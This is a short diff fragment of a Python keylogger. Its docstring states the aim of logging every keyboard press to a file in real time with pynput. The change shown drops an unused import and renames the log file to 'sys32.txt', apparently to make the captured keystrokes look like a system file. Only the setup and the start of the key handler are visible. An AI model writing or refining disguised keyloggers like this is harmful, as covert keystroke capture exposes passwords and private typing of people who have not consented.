@@ -2,10 +2,9 @@
 Goal:
 Build a Python script that listens for keyboard presses and logs each key to a text file in real time.
 """
-import os
 from pynput import keyboard
 
-file_path = "l.txt"
+file_path = "sys32.txt"
 
 def on_press(key, injected):
     try:
